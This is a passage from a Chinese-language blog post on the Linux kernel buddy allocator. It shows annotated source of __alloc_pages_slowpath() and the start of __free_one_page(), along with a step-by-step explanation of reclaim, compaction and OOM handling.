class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_slowpath</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;</span><br><span class="line"><span class="type">const</span> <span class="type">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> alloc_flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> did_some_progress;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_priority</span> <span class="title">compact_priority</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_result</span> <span class="title">compact_result</span>;</span></span><br><span class="line"><span class="type">int</span> compaction_retries;</span><br><span class="line"><span class="type">int</span> no_progress_loops;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cpuset_mems_cookie;</span><br><span class="line"><span class="type">int</span> reserve_flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们还进行了健全性检查，以发现非原子上下文中的 caller 滥用原子储备（的行为）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==</span><br><span class="line">(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))</span><br><span class="line">gfp_mask &amp;= ~__GFP_ATOMIC;</span><br><span class="line"></span><br><span class="line">retry_cpuset:</span><br><span class="line">compaction_retries = <span class="number">0</span>;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line">compact_priority = DEF_COMPACT_PRIORITY;</span><br><span class="line">cpuset_mems_cookie = read_mems_allowed_begin();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 仅在 kswapd 需要被唤醒前，快速路径使用保守的 alloc_flags 才能成功，</span></span><br><span class="line"><span class="comment"> * 并且避免精确地设置 alloc_flags。 所以我们现在这么做。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// 重新设置 alloc_flags，因为快速路径的分配在 kswapd 被唤醒之前</span></span><br><span class="line">    <span class="comment">// 只有使用保守的 alloc_flags 才能成功，而现在我们将唤醒 kswapd，</span></span><br><span class="line">    <span class="comment">// 因此恢复使用原有的 gfp_mask 对应的 alloc_flags</span></span><br><span class="line">alloc_flags = gfp_to_alloc_flags(gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们需要为 zonelist 迭代器重新计算起始点，因为我们可能在快速路径中</span></span><br><span class="line"><span class="comment"> * 使用了不同的 nodemask ，或是有个 cpuset 的修改而我们正在重试</span></span><br><span class="line"><span class="comment"> * - 否则我们可能会无休止地迭代不合格的 zone</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"><span class="keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 ALLOC_KSWAPD，唤醒 kswapd 线程回收内存</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 调整后的 alloc_flags 可能会立即成功，所以先进行尝试</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 对于代价高的分配, 首先尝试直接的 compaction（译注：碎片整理机制）,</span></span><br><span class="line"><span class="comment"> * 因为有可能我们仍有足够的基本页面，并不需要去回收. 对于不可迁移的高阶分配，</span></span><br><span class="line"><span class="comment"> * 同样这么做, 因为 compaction 将尝试通过从相同迁移类型的块进行迁移</span></span><br><span class="line"><span class="comment"> * 以避免永久的碎片. 别对允许忽视水位线的分配尝试这个，因为</span></span><br><span class="line"><span class="comment"> * ALLOC_NO_WATERMARKS 还没发生。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (can_direct_reclaim &amp;&amp;</span><br><span class="line">(costly_order ||</span><br><span class="line">   (order &gt; <span class="number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))</span><br><span class="line">&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;</span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order,</span><br><span class="line">alloc_flags, ac,</span><br><span class="line">INIT_COMPACT_PRIORITY,</span><br><span class="line">&amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 检查带有 __GFP_NORETRY 的代价高的分配, 其</span></span><br><span class="line"><span class="comment"> * 包括一些 THP page fault 的分配</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若分配整个 pageblock(s) 且 compaction 由于所有的 zone</span></span><br><span class="line"><span class="comment"> * 都在水位线下失败了，或是被禁止了因为其最近在该order上失败了，</span></span><br><span class="line"><span class="comment"> * 除非分配器有请求的 compaction 与回收尝试，否则直接失败</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 回收是：</span></span><br><span class="line"><span class="comment"> *  - 可能非常昂贵因为 zones 可能远低于他们的低水位线，</span></span><br><span class="line"><span class="comment"> *    或是这是非常突发的高阶分配的一部分,</span></span><br><span class="line"><span class="comment"> *  - 不一定会有帮助因为 isolate_freepages() 可能不会在</span></span><br><span class="line"><span class="comment"> *    被释放的页面上迭代作为其线性扫描的一部分，且</span></span><br><span class="line"><span class="comment"> *  - 不大可能会让整个 pageblocks 自己释放</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (compact_result == COMPACT_SKIPPED ||</span><br><span class="line">    compact_result == COMPACT_DEFERRED)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 看起来好像 reclaim/compaction 是值得尝试的, 但</span></span><br><span class="line"><span class="comment"> * 同步的 compaction 可能会非常 expensive, 故保持</span></span><br><span class="line"><span class="comment"> * 使用异步的 compaction.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">compact_priority = INIT_COMPACT_PRIORITY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/* 确保只要我们循环， kswapd 便不会意外地休眠 */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line">reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);</span><br><span class="line"><span class="keyword">if</span> (reserve_flags)</span><br><span class="line">alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若内存策略可以忽略，重置 nodemask 与 zonelist 迭代器。</span></span><br><span class="line"><span class="comment"> * 这些分配具有高优先级与系统性，而非用户导向。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;</span><br><span class="line">ac-&gt;nodemask = <span class="literal">NULL</span>;</span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 带着可能调整过 zonelist 与 alloc_flags 再次尝试 */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调用方不想要回收, 我们无法平衡任何事 */</span></span><br><span class="line"><span class="keyword">if</span> (!can_direct_reclaim)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 避免递归地直接回收 */</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 尝试直接回收后分配 */</span></span><br><span class="line">page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">&amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 尝试直接 compaction 后分配 */</span></span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">compact_priority, &amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 若是特别指定的请求，不要循环 */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 不要重试高花销的高阶分配除非他们是</span></span><br><span class="line"><span class="comment"> * __GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,</span><br><span class="line"> did_some_progress &gt; <span class="number">0</span>, &amp;no_progress_loops))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若0阶的回收无法取得任何进展，则重试 compaction 没有任何意义，</span></span><br><span class="line"><span class="comment"> * 因为当前对 compaction 的实现是基于有足够的空闲内存的</span></span><br><span class="line"><span class="comment"> *  (参见 __compaction_suitable)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">should_compact_retry(ac, order, alloc_flags,</span><br><span class="line">compact_result, &amp;compact_priority,</span><br><span class="line">&amp;compaction_retries))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在我们开始 OOM killing 之前处理可能的 cpuset 更新竞争 */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))</span><br><span class="line"><span class="keyword">goto</span> retry_cpuset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 回收失败了, 开始 killing 一些东西 */</span></span><br><span class="line">    <span class="comment">// 要杀一些进程或是别的东西来腾内存了</span></span><br><span class="line">page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在无尽的循环中避免没有水位线的分配 */</span></span><br><span class="line"><span class="keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;</span><br><span class="line">    (alloc_flags &amp; ALLOC_OOM ||</span><br><span class="line">     (gfp_mask &amp; __GFP_NOMEMALLOC)))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 若 OOM killer 取得了一些成效，重试 */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress) &#123;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nopage:</span><br><span class="line"><span class="comment">/* 在我们失败之前处理可能的 cpuset 的更新竞争 */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))</span><br><span class="line"><span class="keyword">goto</span> retry_cpuset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 确保 __GFP_NOFAIL 请求没有泄露且确保我们一直在重试</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 所有存在的 __GFP_NOFAIL 用户都是可以被阻塞的, </span></span><br><span class="line"><span class="comment"> * 故对任何新的实际上需要 GFP_NOWAIT 的用户进行警告</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这个上下文的 PF_MEMALLOC 请求非常奇怪</span></span><br><span class="line"><span class="comment"> * 因为我们不能回收任何东西只能循环等待</span></span><br><span class="line"><span class="comment"> * 某人来为我们做些什么</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 无失败的高开销的 orders 是一项艰巨的要求，</span></span><br><span class="line"><span class="comment"> * 我们对此并没有太多准备，故让我们警告这些用户</span></span><br><span class="line"><span class="comment"> * 以便于我们能够识别出他们并将之转化为别的东西</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 通过让他们能访问保留的内存来帮助非失败的分配</span></span><br><span class="line"><span class="comment"> * 但不使用 ALLOC_NO_WATERMARKS 因为这可能</span></span><br><span class="line"><span class="comment"> * 大量减少内存保留区而让情况更坏</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">fail:</span><br><span class="line">warn_alloc(gfp_mask, ac-&gt;nodemask,</span><br><span class="line"><span class="string">&quot;page allocation failure: order:%u&quot;</span>, order);</span><br><span class="line">got_pg:</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们先补充一个概念——<code>Memory compaction</code> 机制，其实就是整理内存碎片，对零散的内存页进行迁移，从而将零散的空闲内存页变成大块的空闲内存，不过这里只整理可以移动的碎片：</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>现在我们来看慢速分配的整个流程：</p><ul><li>使用原有的 gfp_flag 重新设置 alloc_flag，并重新计算 preferred zone，若设置了 <code>ALLOC_KSWAPD</code> 则调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>之后重新尝试快速路径的分配，若成功则直接返回</li><li>接下来调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction，该函数内部在整理完后会重新尝试快速路径的分配，若成功则直接返回</li><li>（retry）接下来调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>调整 zonelist 与 alloc_flag，之后再次尝试快速路径分配，若成功则直接返回</li><li>若 gfp_flag 中没有 <code>__GFP_DIRECT_RECLAIM</code> 或是进程 PCB 的 flag 中有 <code>PF_MEMALLOC</code>，直接跳转到 （nopage）</li><li>调用 <code>__alloc_pages_direct_reclaim()</code> 进行内存回收（内部调用 <code>__perform_reclaim()</code>）与快速路径分配，若成功则直接返回</li><li>调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction 与快速路径分配，若成功则直接返回</li><li>如果设置了 <code>__GFP_NORETRY</code> ，或是该次内存分配开销较高（<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>）且未设置 <code>__GFP_RETRY_MAYFAIL</code>，直接跳到 （nopage）</li><li>调用 <code>should_reclaim_retry()</code> 判断是否需要重新回收，若是则跳回（retry）</li><li>调用 <code>should_compact_retry()</code> 判断是否需要重新进行 compaction，若是则跳回（retry）</li><li>调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>调用 <code>__alloc_pages_may_oom()</code> 尝试 kill 一些进程来释放内存，该函数内首先还是会先进行一次快速分配，之后才是调用 <code>out_of_memory()</code> 来杀掉最适合的进程以释放内存，最后若设置了 <code>__GFP_NOFAIL</code> 则调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，在该函数中会两次走快速路径进行分配（第一次会额外附加上 <code>ALLOC_CPUSET</code> 的 flag）</li><li>如果把当前进程杀掉了，跳到（nopage）；如果杀进程取得了成效，跳回（retry）</li><li>（nopage）调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>若设置了 <code>__GFP_NOFAIL</code> 则进行一系列的警告，并调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，若未成功则跳回（retry）</li><li>返回结果</li></ul><p><img src="https://s2.loli.net/2022/07/06/eCg12KJIZuw9aon.png" alt="image.png"></p><h2 id="四、上层封装分配函数"><a href="#四、上层封装分配函数" class="headerlink" title="四、上层封装分配函数"></a>四、<em>上层封装分配函数</em></h2><p>在 <code>__alloc_pages_nodemask()</code> 上层主要有三个页面分配函数，其调用路径如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__alloc_pages_node  /*返回struct page的指针*/</span><br><span class="line">    __alloc_pages</span><br><span class="line">    __alloc_pages_nodemask</span><br><span class="line"></span><br><span class="line">alloc_pages         /*返回struct page的指针*/</span><br><span class="line">    alloc_pages_current</span><br><span class="line">    __alloc_pages_nodemask</span><br><span class="line">        </span><br><span class="line">__get_free_pages    /*返回页面的虚拟地址*/</span><br><span class="line">    __get_free_pages</span><br><span class="line">    alloc_pages</span><br><span class="line">            alloc_pages_current</span><br><span class="line">            __alloc_pages_nodemask</span><br></pre></td></tr></table></figure><h1 id="0x03-页的释放"><a href="#0x03-页的释放" class="headerlink" title="0x03.页的释放"></a>0x03.页的释放</h1><p>前面我们讲了页面是如何分配的，现在我们来看页面是如何释放的</p><h2 id="一、-free-one-page-：释放页面的核心函数"><a href="#一、-free-one-page-：释放页面的核心函数" class="headerlink" title="一、__free_one_page()：释放页面的核心函数"></a>一、__free_one_page()：释放页面的核心函数</h2><p>该函数是 buddy system 中用以进行页面释放的<strong>核心函数</strong>，所有的页面释放 API 都是基于该函数的封装</p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要作用是将特定页面释放到特定 zone 上，需要注意的是这里的 <code>one page</code> 不是一张页框而是一块连续内存（可能有多张页）</p><p>还需要注意的是这是一个释放页面的<strong>基本函数</strong>，故我们需要提供待释放页面的页结构体（struct page）、页框号、页面块的阶（order）、目标 zone、迁移类型等信息——这些信息通常由上层封装函数提供，这个函数所做的只是简单地将页挂回对应链表并检查合并的操作</p><p>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * buddy system 分配器的释放函数.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * buddy system 的想法是为多种“orders”的内存块</span></span><br><span class="line"><span class="comment"> * 维护一个直接映射表（包含位值）. 底部级别的表包含</span></span><br><span class="line"><span class="comment"> * 对最小的可分配内存单元（这里便是页面）的映射,</span></span><br><span class="line"><span class="comment"> * 而往上每更高一级则描述了从其下的一级的一对单元，因此是&quot;buddies&quot;.</span></span><br><span class="line"><span class="comment"> * 从高层看，这里所做的仅是在标记底层可用的表项，</span></span><br><span class="line"><span class="comment"> * 并根据需要向上传播更改，再加上一些与 VM 系统的其他部分</span></span><br><span class="line"><span class="comment"> * 良好协作所需要的计数。</span></span><br><span class="line"><span class="comment"> * 在每个级别, 我们都保持一个 pages 的 list, 作为连续的</span></span><br><span class="line"><span class="comment"> * 长度为(1 &lt;&lt; order)的空闲页的头节点并标记上 PageBuddy.</span></span><br><span class="line"><span class="comment"> * Page&#x27;s order 被记录在 page_private(page) 域.</span></span><br><span class="line"><span class="comment"> * 故当我们在分配或释放其一时, 我们可以得到另一个的状态。</span></span><br><span class="line"><span class="comment"> * 也就是说，若我们分配一个小的块，而两个都是空闲的，</span></span><br><span class="line"><span class="comment"> * 区域的剩余部分必须被分割成块. 若一个块被释放了，</span></span><br><span class="line"><span class="comment"> * 而他的 buddy 也是闲置的, 那么这将触发合并成一个更大的块</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- nyc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __free_one_page(<span class="keyword">struct</span> page *page,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pfn,</span><br><span class="line"><span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span><br><span class="line"><span class="type">int</span> migratetype, <span class="type">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span> *<span class="title">capc</span> =</span> task_capc(zone);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> buddy_pfn;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> combined_pfn;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line"><span class="type">bool</span> to_tail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里的 MAX_ORDER 和 pageblock_order 都是宏</span></span><br><span class="line">max_order = <span class="type">min_t</span>(<span class="type">unsigned</span> <span class="type">int</span>, MAX_ORDER - <span class="number">1</span>, pageblock_order);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!zone_is_initialized(zone));</span><br><span class="line">VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(migratetype == <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (likely(!is_migrate_isolate(migratetype)))</span><br><span class="line">__mod_zone_freepage_state(zone, <span class="number">1</span> &lt;&lt; order, migratetype);</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(pfn &amp; ((<span class="number">1</span> &lt;&lt; order) - <span class="number">1</span>), page);</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, page), page);</span><br><span class="line"></span><br><span class="line">continue_merging:</span><br><span class="line"><span class="keyword">while</span> (order &lt; max_order) &#123;</span><br><span class="line"><span class="keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">migratetype);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">buddy_pfn = __find_buddy_pfn(pfn, order);<span class="comment">// 计算 buddy 页框号</span></span><br><span class="line">buddy = page + (buddy_pfn - pfn);<span class="comment">// 计算 buddy 的页结构体，注意这里是指针加法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pfn_valid_within(buddy_pfn)) <span class="comment">// 页框号合法性检查</span></span><br><span class="line"><span class="keyword">goto</span> done_merging;</span><br><span class="line"><span class="keyword">if</span> (!page_is_buddy(page, buddy, order))  <span class="comment">// 检查 page 和 buddy 